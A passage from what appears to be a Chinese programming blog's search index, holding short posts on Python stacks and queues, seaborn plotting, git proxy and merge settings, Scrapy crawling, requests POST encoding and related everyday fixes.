    <content type="text"><![CDATA[Python中可以用list来模拟栈和队列：栈（stack）:只能在一端进行数据操作，遵循后进先出（LIFO）原则队列（queue）:可以在两端进行数据操作，遵循先进先出（FIFO）原则，出队列的一端称为队首，入队列的一端称为队尾一、栈1、栈要记录的数据栈顶位置top：注意这个top有两种理解方式，一种是表示栈的最后一个数据的位置，另一种是表示栈的最后一个数据的下一个位置，这两种理解对栈的操作代码有一定的影响栈最大大小size2、栈的操作isEmpty()：判断栈是否为空isFull()：判断栈是否已满push(element)：向栈中添加一个值，注意栈是否为满的pop()：从栈中弹出一个值，注意栈是否为空3、Python列表实现栈12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class StackException(Exception): def __init__(self, data): self.data = data def __str__(self): return self.dataclass Stack(object): def __init__(self,size = 10): self.S = [] self.size = size # 栈大小 self.top = -1 # 栈顶位置 def setSize(self, size): # 设置栈的大小 self.size = size def isEmpty(self): # 判断栈是否为空 if self.top == -1: return True else: return False def isFull(self): # 判断栈是否满 if self.top == self.size - 1: return True else: return False def peek(self): # 查看栈顶的对象，但不移除 if self.isEmpty(): raise StackException('StackUnderflow') else: element = self.S[-1] return element def pop(self): # 移除栈顶对象，并返回该对象的值 if self.isEmpty(): raise StackException('StackUnderflow') else: element = self.S[-1] self.top = self.top - 1 del self.S[-1] return element def push(self, element): # 把对象压入栈顶 if self.isFull(): raise StackException('StackOverflow') else: self.S.append(element) self.top = self.top + 1123456789101112131415161718if __name__ == '__main__': s = Stack() # 压栈测试 for i in range(10): s.push(i) # 栈满测试 try: s.push(1) except Exception as e: print(e) # 出栈测试 for i in range(10): print(s.pop()) # 栈空测试 try: s.pop() except Exception as e: print(e)二、队列1、队列要记录的数据队头位置end队列的大小size2、标准做法利用数组Q[1..n]来实现含有n-1个元素队列（保留一位元素用来判断队列空或满）。该列有一个属性Q.head指向队头元素，属性Q.tail指向下一个新元素将要插入的位置，列中的元素存放在位置Q.head, Q.head+1, …, Q.tail-1上。初始时，Q.head = Q.tail = 1当Q.head = Q.tail时， 队列为空当Q.head = Q.tail + 1时，队列为满3、队列的操作isEmpty()：判断队列是否为空isFull()：判断队列是否已满inQueue(element)：入队outQueue()：出队4、Python列表实现队列123456789101112131415161718192021222324252627282930313233class QueueException(Exception): def __init__(self, data): self.data = data def __str__(self): return self.dataclass Queue(object): def __init__(self, size=10): self.Q = [] self.size = size # 队列大小 self.end = -1 # 队头位置 def setSize(self, size): # 设置队列的大小 self.size = size def inQueue(self, element): # 对象入队 if self.end &lt; self.size - 1: self.Q.append(element) self.end += 1 else: raise QueueException('QueueFull') def outQueue(self): # 对象出队 if self.end == -1: raise QueueException('QueueEmpty') else: element = self.Q[0] self.Q = self.Q[1:] self.end -= 1 return element123456789101112131415161718if __name__ == '__main__': q = Queue() # 入队测试 for i in range(10): q.inQueue(i) # 队列满测试 try: q.inQueue(1) except Exception as e: print(e) # 出队测试 for i in range(10): print(q.outQueue()) # 队列空测试 try: q.outQueue() except Exception as e: print(e)]]></content>
      <categories>
        <category>Python</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub的Markdown文件插入公式方法]]></title>
    <url>%2Farchives%2F22f997b6.html</url>
    <content type="text"><![CDATA[Markdown 原生就是不支持LaTeX的，GitHub Flavored Markdown 同样不支持。Markdown 的初衷就是成为一种与HTML兼容的“易读易写”的轻量级的网络标记语言，并不要求支持 LaTeX。本文介绍以下两个方法来在GitHub的Markdown文件插入公式并显示。一、插入动态公式在CodeCogs Equation Editor线上生成图片然后在Markdown文件中插入：1![](http://latex.codecogs.com/gif.latex?%5Csigma%3D%5Csqrt%7B%5Cfrac%7B1%7D%7Bn%7D%7B%5Csum_%7Bk%3D1%7D%5En%28x_i-%5Cbar%7Bx%7D%29%5E2%7D%7D)具体公式的Latex代码：1\sigma=\sqrt&#123;\frac&#123;1&#125;&#123;n&#125;&#123;\sum_&#123;k=1&#125;^n(x_i-\bar&#123;x&#125;)^2&#125;&#125;下面是显示的公式：注意要双反斜线\\来escape具体使用方法：二、chrome插件chrome的插件GitHub with MathJax可以在你自己的浏览器解析tex公式，但是没装插件的人看着还是源码。]]></content>
      <categories>
        <category>工具使用</category>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[链接到GitHub特定行号]]></title>
    <url>%2Farchives%2F231f8283.html</url>
    <content type="text"><![CDATA[注意：不要只是链接到行号！一定要使用canonical URL(标准链接)。否则，当该文件更新时，有可能会指向错误行！首先点击你想要的行号(如第18行)，你的浏览器中的URL将得到一个#L18，如下所示：1https://github.com/git/git/blob/master/README#L18如果要选择多行，只需按住shift键，然后单击第二行数字，如第20行。现在浏览器网址如下所示：1https://github.com/git/git/blob/master/README#L18-L20下面是最重要的一步：现在通过按y键得到特定提交的标准链接。现在浏览器网址变为如下所示：1https://github.com/git/git/blob/5bdb7a78adf2a2656a1915e6fa656aecb45c1fc3/README#L18-L20该链接包含该特定提交的SHA，而不是主节点上当前版本的文件。这意味着这个链接将永远工作，而不是指向该文件（以及未来版本）的第18-20行。参考：Getting permanent links to files]]></content>
      <categories>
        <category>工具使用</category>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seaborn lineplot图例标题设置]]></title>
    <url>%2Farchives%2F18ecf180.html</url>
    <content type="text"><![CDATA[在进行lineplot()绘制折线图的时候，如果用了hue参数同时绘制多个类别图，这时候seaborn会把这个hue的标签当做图例的子标题。本文介绍了几个修改、删除此不需要的图例标题的方法。一、问题描述下面是我的lineplot()代码，如果此方法用了hue参数同时绘制多个类别图，这时候seaborn会把这个hue的标签当做子标题。1sns.lineplot(x="time", y="value", hue="category", data=df)如果我用下面的方法，会产生一个新图例的标题，原来的图例标题并没有被修改：1ax.legend().set_title('title')二、问题分析seaborn会错误的把图例的标题当做一个subgroup-title。seaborn is misusing a legend label as a (subgroup-)title.三、解决方法1、修改此子标题方法12legend = ax.legend() legend.texts[0].set_text("Whatever else")2、移除此子标题方法12handles, labels = ax.get_legend_handles_labels()ax.legend(handles=handles[1:], labels=labels[1:])3、去掉子标题，加上真正的标题方法12handles, labels = ax.get_legend_handles_labels()ax.legend(handles=handles[1:], labels=labels[1:], title="Whatever else")]]></content>
      <categories>
        <category>Python</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>seaborn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seaborn双变量分布jointplot的坐标轴标签设置]]></title>
    <url>%2Farchives%2F879a6ea0.html</url>
    <content type="text"><![CDATA[我采用jointplot()进行双变量分布绘图，但是没法通过plt.xlabel来修改它的坐标轴标签。下面是解决办法。一、问题描述我采用jointplot()进行双变量分布绘图：1sns.jointplot(x, y)但是没法通过plt.xlabel来修改它的坐标轴标签。二、解决办法这里要用到JointGrid对象。jointplot()函数基于JointGrid对象来控制图形。我们可以直接使用JointGrid来获得更高的灵活性。jointplot()在绘制完成后会返回一个JointGrid对象，我们可以通过它来增加更多图层或者调整其他细节。下面是一个的修改jointplot()坐标轴标签的实例：&#123;cmd1234567891011121314151617181920212223import matplotlib.pyplot as pltimport seaborn as snsimport numpy as np#example dataX = np.random.randn(1000,)Y = 0.2 * np.random.randn(1000) + 0.5h = sns.jointplot(X, Y)# JointGrid has a convenience functionh.set_axis_labels('x', 'y', fontsize=16)# or set labels via the axes objectsh.ax_joint.set_xlabel('new x label', fontweight='bold')# also possible to manipulate the histogram plots this way, e.g.h.ax_marg_y.grid('on')# labels appear outside of plot area, so auto-adjustplt.tight_layout()plt.show()如果采用plt.xlabel（“text”）方法，这个方法会作用在在当前ax上，而不是在sns.jointplot的ax上。因此需要用jointplot()返回的JointGrid对象来控制。]]></content>
      <categories>
        <category>Python</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>seaborn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub代理设置]]></title>
    <url>%2Farchives%2Fcbef72d4.html</url>
    <content type="text"><![CDATA[国内git clone一个GitHub上的仓库太慢，经常连接失败。下面是解决办法。一、代理设置1、全局代理设置12git config --global http.proxy http://127.0.0.1:1080git config --global https.proxy https://127.0.0.1:1080这里可以打开SS查看代理设置，查看自己的端口是否为1080，不是的改为对应的端口。2、只对GitHub进行代理如果挂了全局代理，克隆coding之类的国内仓库会变慢，所以我建议使用如下命令，只对GitHub进行代理，对国内的仓库不影响。12git config --global http.https://github.com.proxy https://127.0.0.1:1080git config --global https.https://github.com.proxy https://127.0.0.1:1080如果在输入这条命令之前，已经输入全局代理的话，可以按照二、取消代理的方法进行取消。注意：以上两点都是对https协议进行代理设置，也就是仅对git clone https://www.github.com/xxxx/xxxx.git这种命令有效。对于SSH协议，也就是git clone git@github.com:xxxxxx/xxxxxx.git这种，依旧是无效的。3、sock5代理设置之前说的是http代理，有人反映ss暴露的是socks5。下面附上socks5代理的方法。1、首先查看自己socks5的端口号，假设为：127.0.0.1:10862、输入以下命令：12git config --global http.https://github.com.proxy socks5://127.0.0.1:1086git config --global https.https://github.com.proxy socks5://127.0.0.1:1086二、取消代理12git config --global --unset http.proxygit config --global --unset https.proxy三、查看已有配置1git config --global -l参考：汪小九的回答]]></content>
      <categories>
        <category>工具使用</category>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python中list转换array的一个问题]]></title>
    <url>%2Farchives%2F26ce33e.html</url>
    <content type="text"><![CDATA[我在数据分析过程中需要将list转换为array，但是转换的过程出了一点问题，下面是记录。一、list转换为array的方法下面的a是一个list类型，如果要进行numpy的一些数值运算，我们就需要将它转换为array类型。123import numpy as npa = [[1,2,3],[4,5,6]]转换如下：12345import numpy as npa = [[1,2,3],[4,5,6]]a_array = np.array(a)print(a_array)转换得到的a_array则是array类型。一个二维三列的数组。二、一个问题在list转换为array的过程中，当list的维度不一样的时候，array并不能将其解释为数组形式，而是解释为一个object类型。举个例子：12345import numpy as npa = [[1,2,3],[4,5,6,7]]a_array = np.array(a)print(a_array.shape)这个时候的a_array.shape并不是（2L,3L），而是(2L,)，并没有第二维了。因为你维度二的个数是不一样的。这个时候就会将[1,2,3]解释为一个object，将[4,5,6,7]解释为一个object，上面的(2L,)就是相当于俩行，没有第二列。]]></content>
      <categories>
        <category>Python</category>
        <category>数据处理</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows几个隐私设置]]></title>
    <url>%2Farchives%2F52e9c999.html</url>
    <content type="text"><![CDATA[本文主要介绍Win10系统下的隐私设置：文件夹下不显示最近打开的文件、右键任务栏图标不显示最近打开的文件以及Win7系统下右键任务栏图标不显示最近打开的文件。一、Win10文件夹下不显示最近打开的文件win10系统的“最近使用的文件”功能，它可以让我们快速打开之前访问过的文件，但另一方面又让我们的隐私予以泄露，你看过哪些文件，别人通过“最近使用的文件”的功能就能看到。1、在桌面上打开“此电脑”图标2、进到【此电脑】中，切换到“查看”选项卡，点击右侧的“选项”按钮。如图所示：3、此时将打开“文件夹选项”界面，切换到“常规”选项卡，从“隐私”栏目中清除勾选“在‘快速访问’中显示最近使用的文件”和“在‘快速访问’中显示常用文件夹”两个项即可。二、Win10右键任务栏图标不显示最近打开的文件Win10设置-个性化-开始-将“在开始屏幕或任务栏的跳转列表中显示最近打开的项”关闭即可。三、Win7右键任务栏图标不显示最近打开的文件1、单击打开“任务栏和「开始」菜单属性”。2、单击“「开始」菜单”选项卡，然后在“隐私”下，清除“存储并显示最近在「开始」菜单中打开的程序列表”复选框。3、单击“确定”。]]></content>
      <categories>
        <category>工具使用</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python fake_useragent报错解决方案]]></title>
    <url>%2Farchives%2F3caecd5b.html</url>
    <content type="text"><![CDATA[我在调用fake_useragent这个包时出现fake_useragent.errors.FakeUserAgentError: Maximum amount of retries reached错误，本文详细分析了这个错误并且给出了解决方案。一、错误信息这是报错的命令：12from fake_useragent import UserAgentua = UserAgent()这是错误信息：12345678Traceback (most recent call last): File &quot;f:\python36\lib\site-packages\fake_useragent\utils.py&quot;, line 154, in load for item in get_browsers(verify_ssl=verify_ssl): File &quot;f:\python36\lib\site-packages\fake_useragent\utils.py&quot;, line 97, in get_browsers html = get(settings.BROWSERS_STATS_PAGE, verify_ssl=verify_ssl) File &quot;f:\python36\lib\site-packages\fake_useragent\utils.py&quot;, line 84, in get raise FakeUserAgentError(&apos;Maximum amount of retries reached&apos;)fake_useragent.errors.FakeUserAgentError: Maximum amount of retries reached二、错误分析依据报错，初步推断是网络超时，从网查阅资料得知，这个库会引用在线资源，经排查，fake_useragent\settings.py相关配置如下：12345678910111213141516171819202122# -*- coding: utf-8 -*-from __future__ import absolute_import, unicode_literalsimport osimport tempfile__version__ = '0.1.11'DB = os.path.join( tempfile.gettempdir(), 'fake_useragent_&#123;version&#125;.json'.format( version=__version__, ),)CACHE_SERVER = 'https://fake-useragent.herokuapp.com/browsers/&#123;version&#125;'.format( version=__version__,)BROWSERS_STATS_PAGE = 'https://www.w3schools.com/browsers/default.asp'BROWSER_BASE_PAGE = 'http://useragentstring.com/pages/useragentstring.php?name=&#123;browser&#125;' # noqa其中，这个网站https://www.w3schools.com/browsers/default.asp打不开，导致超时报错依次查看其它url，发现都可以正常打开，其中CACHE_SERVER是存储了所有UserAgent的json数据，再次观察其中DB这个变量，结合fake_useragent\fake.py中的逻辑，判断这个变量应该是存储json数据的，所以大体逻辑应该是，首次初始化时，会自动爬取CACHE_SERVER中的json数据，然后将其存储到本地，所以我们直接将json存到指定路径下，再次初始化时，应该就不会报错。三、根本解决方案1、查看指定路径123import tempfileprint(tempfile.gettempdir())1/var/folders/6_/p67xz49j5wd5lzx7s2cz1cdr0000gn/T2、手动下载json文件我们需要将CACHE_SERVER的json数据保存为fake_useragent_0.1.11.json,并放到目录/var/folders/6_/p67xz49j5wd5lzx7s2cz1cdr0000gn/T中。1wget https://fake-useragent.herokuapp.com/browsers/0.1.11这时我们就会得到一个0.1.11的文件，将文件名改为fake_useragent_0.1.11.json：1mv 0.1.11 fake_useragent_0.1.11.json最后将文件拷贝到临时目录中即可1cp fake_useragent_0.1.11.json /var/folders/6_/p67xz49j5wd5lzx7s2cz1cdr0000gn/T/当我们再次实例化 UserAgent 的时候，就会先读取本地的临时文件，这样实例化的时候就不会报错了。注：如果CACHE_SERVER不是https://fake-useragent.herokuapp.com/browsers/0.1.11，请更新一下库pip install --upgrade fake_useragent。四、简单的解决方案——在实例化的时候指定一些参数这里首先需要更新下库：1pip install --upgrade fake_useragent如果不希望缓存数据库或不需要可写文件系统：1ua = UserAgent(use_cache_server=False)如果不想使用宿主缓存服务器，可以禁用服务器缓存：1ua = UserAgent(cache=False)忽略ssl验证1ua = UserAgent(verify_ssl=False)参考：Python3 fake_useragent 模块的使用和报错解决方案]]></content>
      <categories>
        <category>爬虫</category>
        <category>问题</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python如何爬取不确定页数的网页]]></title>
    <url>%2Farchives%2Ff6b24b05.html</url>
    <content type="text"><![CDATA[本文详细分析了如何爬取不知道具体有多少页的网站，然后用scrapy框架实现了这个过程。一、问题分析我们通常遇到的网站页数展现形式有这么几种：第一种是直观地显示所有页数，显示在页面上。第二种是不直观显示网页总页数，需要抓包才可以看到，一般来说会有一个totalPage参数。第三种是不知道具体有多少页的网页。对于，前两种形式的网页，爬取方法非常简单，使用 For 循环从首页爬到尾页就行了，第三种形式则不适用，因为不知道尾页的页数，所以循环到哪一页结束无法判断。二、解决方案这里有两种解决方式：第一种方式：使用 For 循环，尾页的页数设置一个较大的参数，足够循环爬完所有页面。第二种方法：使用 While 循环，可以结合 break 语句，也可以设起始循环判断条件为 True，从头开始循环爬取直到爬完最后一页，然后更改判断条件为 False 跳出循环，结束爬取。三、实际案例——scrapy实现1、For循环实现Scrapy 中使用 For 循环递归爬取的思路非常简单，即先批量生成所有请求的 URL，包括最后无效的 URL，后续在 parse 方法中添加 if 判断过滤无效请求。由于 Scrapy 依赖于Twisted框架，采用的是异步请求处理方式，可以边发送请求边解析内容，不会被阻塞，但是这种方法会发送很多无用请求。123456789101112131415161718def start_requests(self): url_lists = [] for i in range(0,500): req = scrapy.Request(self.url.format(url_tags = self.tags[0],url_start = 20*i,url_genres = self.genres[0])) url_lists.append(req) return url_lists def parse(self, response): # 判断该页是否有内容，数值定为20是因为无内容时长度是11 if len(response.body) &gt;= 20: movie = IDItem() dicts = json.loads(response.body) data_list = dicts['data'] for data in data_list: movie['ids'] = data['id'] #... yield movie2、While循环实现While 循环的思路是先从头开始爬取，使用parse()方法进行解析，然后递增页数构造下一页的URL请求，再循环解析，直到爬取完最后一页。这样不会发送无用的请求。但是难以利用scrapy异步的优势。这里构造下一页请求时需要利用parse()方法中的参数，可以使用meta方法来传递参数。123456789101112131415161718192021222324252627def start_requests(self): url_lists = [] for i in range(len(self.genres)): dict_meta = &#123;'tag_meta':self.tags[0],'page':0,'genre_meta':self.genres[i]&#125; req = scrapy.Request(self.url.format(url_tags = self.tags[0],url_start = 20*0,url_genres = self.genres[i]),meta = dict_meta) url_lists.append(req) return url_lists def parse(self, response): # 判断该页是否爬完，数值定为20是因为无内容时长度是11 if len(response.body) &gt;= 20: movie = IDItem() dicts = json.loads(response.body) data_list = dicts['data'] for data in data_list: movie['ids'] = data['id'] #... yield movie # while循环构造url递归爬下一页 tag_meta = response.meta['tag_meta'] genre_meta = response.meta['genre_meta'] page = response.meta['page'] page += 1 dict_meta = &#123;'tag_meta':tag_meta,'page':page,'genre_meta':genre_meta&#125; yield scrapy.Request(self.url.format(url_tags = tag_meta,url_start = 20*page,url_genres = genre_meta),callback=self.parse,meta=dict_meta)参考：Python For 和 While 循环爬取不确定页数的网页]]></content>
      <categories>
        <category>爬虫</category>
        <category>scrapy</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Scrapy框架的使用之Item Pipeline的用法]]></title>
    <url>%2Farchives%2F5c8b447d.html</url>
    <content type="text"><![CDATA[本文简单介绍一下Scrapy框架中的Item Pipeline的用法。Item Pipeline的调用发生在Spider产生Item之后。当Spider解析完Response之后，Item就会传递到Item Pipeline，被定义的Item Pipeline组件会顺次调用，完成一连串的处理过程，比如数据清洗、存储等。Item Pipeline的主要功能有如下4点。清理HTML数据。验证爬取数据，检查爬取字段。查重并丢弃重复内容。将爬取结果保存到数据库。一、核心方法我们可以自定义Item Pipeline，只需要实现指定的方法，其中必须要实现的一个方法是： process_item(item, spider)。另外还有如下几个比较实用的方法。open_spider(spider)close_spider(spider)from_crawler(cls, crawler)下面我们详细介绍这几个方法的用法。1、process_item(item, spider)process_item()是必须要实现的方法，被定义的Item Pipeline会默认调用这个方法对Item进行处理。比如，我们可以进行数据处理或者将数据写入到数据库等操作。它必须返回Item类型的值或者抛出一个DropItem异常。process_item()方法的参数有如下两个。item，是Item对象，即被处理的Item。spider，是Spider对象，即生成该Item的Spider。process_item()方法的返回类型归纳如下。如果它返回的是Item对象，那么此Item会被低优先级的Item Pipeline的process_item()方法处理，直到所有的方法被调用完毕。如果它抛出的是DropItem异常，那么此Item会被丢弃，不再进行处理。2、open_spider(self, spider)open_spider()方法是在Spider开启的时候被自动调用的。在这里我们可以做一些初始化操作，如开启数据库连接等。其中，参数spider就是被开启的Spider对象。3、close_spider(spider)close_spider()方法是在Spider关闭的时候自动调用的。在这里我们可以做一些收尾工作，如关闭数据库连接等。其中，参数spider就是被关闭的Spider对象。4、from_crawler(cls, crawler)from_crawler()方法是一个类方法，用@classmethod标识，是一种依赖注入的方式。它的参数是crawler，通过crawler对象，我们可以拿到Scrapy的所有核心组件，如全局配置的每个信息，然后创建一个Pipeline实例。参数cls就是Class，最后返回一个Class实例。二、实例1、MongoDB Pipeline我们用一个MongoPipeline将信息保存到MongoDB，在pipelines.py里添加如下类的实现：123456789101112131415161718192021222324import pymongoclass MongoPipeline(object): def __init__(self, mongo_uri, mongo_db): self.mongo_uri = mongo_uri self.mongo_db = mongo_db @classmethod def from_crawler(cls, crawler): return cls( mongo_uri=crawler.settings.get('MONGO_URI'), mongo_db=crawler.settings.get('MONGO_DB') ) def open_spider(self, spider): self.client = pymongo.MongoClient(self.mongo_uri) self.db = self.client[self.mongo_db] def process_item(self, item, spider): self.db[item.collection].insert(dict(item)) return item def close_spider(self, spider): self.client.close()这里需要用到两个变量，MONGO_URI和MONGO_DB，即存储到MongoDB的链接地址和数据库名称。我们在settings.py里添加这两个变量，如下所示：12MONGO_URI = 'localhost'MONGO_DB = 'images360'这样一个保存到MongoDB的Pipeline的就创建好了。这里最主要的方法是process_item()方法，直接调用Collection对象的insert()方法即可完成数据的插入，最后返回Item对象。本资源首发于崔庆才的个人博客静觅： Python3网络爬虫开发实战教程 | 静觅]]></content>
      <categories>
        <category>爬虫</category>
        <category>scrapy</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python requests发送post请求的编码问题]]></title>
    <url>%2Farchives%2Ff49a6d66.html</url>
    <content type="text"><![CDATA[我用requests中的post请求爬取NSFC网站的时候，遇到了JSON parse error: syntax error问题，经过查阅资料和尝试，发现是一个编码问题。下面是问题分析与解决方法。在HTTP协议中，post提交的数据必须放在消息主体中，但是协议中并没有规定必须使用什么编码方式，从而导致了提交方式的不同。服务端根据请求头中的Content-Type字段来获知请求中的消息主体是用何种方式进行编码，再对消息主体进行解析。具体的编码方式包括如下：application/x-www-form-urlencoded:以form表单形式提交数据，最常见也是大家最熟悉的application/json:以json串提交数据。下面使用requests来发送这两种编码的POST请求。一、提交Form表单requests提交Form表单,一般存在于网站的登录，用来提交用户名和密码。以http://httpbin.org/post为例，在requests中，以form表单形式发送post请求，只需要将请求的参数构造成一个字典，然后传给requests.post()的data参数即可。代码如下：1234url = 'http://httpbin.org/post'd = &#123;'key1': 'value1', 'key2': 'value2'&#125;r = requests.post(url, data=d)print(r.text)1234567891011121314151617181920&#123; &quot;args&quot;: &#123;&#125;, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: &#123;&#125;, &quot;form&quot;: &#123; &quot;key1&quot;: &quot;value1&quot;, &quot;key2&quot;: &quot;value2&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Length&quot;: &quot;23&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.20.0&quot; &#125;, &quot;json&quot;: null, &quot;origin&quot;: &quot;121.249.15.110, 121.249.15.110&quot;, &quot;url&quot;: &quot;https://httpbin.org/post&quot;&#125;这里返回的&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,证明这是提交Form的方式。二、提交json串对于提交json串，主要是用于发送ajax请求中，动态加载数据。以NSFC网站为例，加载项目的方式为ajax，项目的内容在响应中。下面是典型的错误用法：1234567891011121314url = "url"headers = &#123;'Content-Type': "application/json", 'Host': "output.nsfc.gov.cn", 'Origin': "http://output.nsfc.gov.cn", 'Referer': "http://output.nsfc.gov.cn/fundingQuery", 'User-Agent': "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",&#125;payload = &#123;'adminID': "", 'beginYear': "", ......&#125;response = requests.post(url = url,data = payload,headers = headers)print(response.text)1&apos;&#123;\n\t&quot;timestamp&quot;:1557026952651,\n\t&quot;status&quot;:400,\n\t&quot;error&quot;:&quot;Bad Request&quot;,\n\t&quot;exception&quot;:&quot;org.springframework.http.converter.HttpMessageNotReadableException&quot;,\n\t&quot;message&quot;:&quot;JSON parse error: syntax error, expect &#123;, actual error, pos 0, fastjson-version 1.2.38; nested exception is com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual error, pos 0, fastjson-version 1.2.38&quot;,\n\t&quot;path&quot;:&quot;/baseQuery/data/supportQueryResultsData&quot;\n&#125;&apos;请求头已经跟抓包得到的保持一致了，加上了&#39;Content-Type&#39;: &quot;application/json&quot;参数，但是无法正确得到响应。这是因为请求实体的格式错了，服务端无法解码。正确方法1——把data进行json编码正确的写法是把data进行json编码，再发送：1response = requests.post(url = url,data = json.dumps(payload),headers = headers)1&apos;&#123;\n\t&quot;code&quot;:200,\n\t&quot;data&quot;:&#123;\n\t\t&quot;iTotalRecords&quot;:76,\n\t\t&quot;resultsData&quot;:[\n\t\t\t[\n\t\t\t\t&quot;59607&quot;,\n\t\t\t\t&quot;调节性树突状细胞负向调控烧伤所致过度炎症反应的信号转导机制研究&quot;,\n\t\t\t\t&quot;81000847&quot;,\n\t\t\t\t&quot;面上项目&quot;,\n\t\t\t\t&quot;中国人民解放军总医院&quot;,\n\t\t\t\t&quot;王强&quot;,\n\t\t\t\t&quot;&quot;,\n\t\t\t\t&quot;2010&quot;,\n\t\t\t\t&quot;调节性树突状细胞；过度炎症反应；信号转导及转录活化因子-3；负向调控免疫；过继治疗&quot;,\n\t\t\t\t&quot;true&quot;,\n\t\t\t\t&quot;5;0;0;0;0&quot;,\n\t\t\t\t&quot;100518&quot;,\n\t\t\t\t&quot;&quot;,\n\t\t\t\t&quot;218&quot;\n\t\t\t]\n\t\t]\n\t&#125;,\n\t&quot;message&quot;:&quot;Success&quot;\n&#125;&apos;正确方法2——使用json参数发送除了将data主动编码为json发送之外，requests还提供了一个json参数，自动使用json方式发送，而且在请求头中也不用显示声明’Content-Type’:’application/json’。12345678910111213url = "url"headers = &#123;'Host': "output.nsfc.gov.cn", 'Origin': "http://output.nsfc.gov.cn", 'Referer': "http://output.nsfc.gov.cn/fundingQuery", 'User-Agent': "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",&#125;payload = &#123;'adminID': "", 'beginYear': "", ......&#125;response = requests.post(url = url,json = payload,headers = headers)print(response.text)同样可以正确得到响应：1&apos;&#123;\n\t&quot;code&quot;:200,\n\t&quot;data&quot;:&#123;\n\t\t&quot;iTotalRecords&quot;:76,\n\t\t&quot;resultsData&quot;:[\n\t\t\t[\n\t\t\t\t&quot;59607&quot;,\n\t\t\t\t&quot;调节性树突状细胞负向调控烧伤所致过度炎症反应的信号转导机制研究&quot;,\n\t\t\t\t&quot;81000847&quot;,\n\t\t\t\t&quot;面上项目&quot;,\n\t\t\t\t&quot;中国人民解放军总医院&quot;,\n\t\t\t\t&quot;王强&quot;,\n\t\t\t\t&quot;&quot;,\n\t\t\t\t&quot;2010&quot;,\n\t\t\t\t&quot;调节性树突状细胞；过度炎症反应；信号转导及转录活化因子-3；负向调控免疫；过继治疗&quot;,\n\t\t\t\t&quot;true&quot;,\n\t\t\t\t&quot;5;0;0;0;0&quot;,\n\t\t\t\t&quot;100518&quot;,\n\t\t\t\t&quot;&quot;,\n\t\t\t\t&quot;218&quot;\n\t\t\t]\n\t\t]\n\t&#125;,\n\t&quot;message&quot;:&quot;Success&quot;\n&#125;&apos;]]></content>
      <categories>
        <category>爬虫</category>
        <category>问题</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git的Fast Forward和no fast foward合并模式对比]]></title>
    <url>%2Farchives%2F37b26b3a.html</url>
    <content type="text"><![CDATA[通常，合并分支时，如果没有分歧解决，就会直接移动文件指针，这就是Fast forward模式。举例来说，开发一直在master分支进行，但忽然有一个新的想法，于是新建了一个dev的分支，并在其上进行一系列提交，完成时，回到master分支，此时，master分支在创建dev分支之后并未产生任何新的commit。此时的合并就叫fast forward。但这种模式下，删除分支后，会丢掉分支信息。如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。一、强制禁用Fast forward模式的具体方法下面我们看下如何强制禁用Fast forward模式（--no-ff方式）的git merge：首先修改readme.md文件，并提交一个新的commit：1234$ git add .$ git commit -am "update readme"[dev 237907d] update readme 1 file changed, 3 insertions(+), 1 deletion(-)现在，我们切换回master：123$ git checkout masterSwitched to branch 'master'Your branch is up-to-date with 'origin/master'.合并dev分支，请注意--no-ff参数，表示禁用Fast forward：1234567$ git merge --no-ff -m "merge with no-ff" devMerge made by the 'recursive' strategy. README.md | 4 +- ...5\217\344\275\234\346\226\207\346\241\243.docx" | Bin 278553 -&gt; 279350 bytes ...234\200\345\212\240\345\210\206\357\274\237.md" | 62 +++++++++++++++++++++ 3 files changed, 65 insertions(+), 1 deletion(-) create mode 100644 